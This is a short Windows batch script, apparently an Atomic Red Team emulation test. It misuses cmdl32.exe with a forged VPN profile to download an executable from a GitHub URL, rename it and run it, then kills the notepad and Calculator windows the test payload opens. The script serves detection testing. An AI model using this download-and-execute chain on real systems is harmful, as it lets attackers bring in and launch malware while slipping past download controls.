mkdir %temp%\T1105
icacls %temp%\T1105 /deny %username%:(OI)(CI)(DE,DC)
set tmp=%temp%\T1105
echo [Connection Manager] > %temp%\T1105\setting.txt
echo CMSFile=setting.txt >> %temp%\T1105\setting.txt
echo ServiceName=AtomicTestService_CMD >> %temp%\T1105\setting.txt
echo TunnelFile=setting.txt >> %temp%\T1105\setting.txt
echo [Settings] >> %temp%\T1105\setting.txt
echo UpdateUrl=https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe >> %temp%\T1105\setting.txt
cmdl32 /vpn /lan %temp%\T1105\setting.txt
icacls %temp%\T1105 /remove:d %username%
move %temp%\T1105\*.tmp %temp%\T1105\file.exe
%temp%\T1105\file.exe
ping -n 10 127.0.0.1 >nul 2>&1
Taskkill /IM notepad.exe /F
Taskkill /IM Calculator.exe /F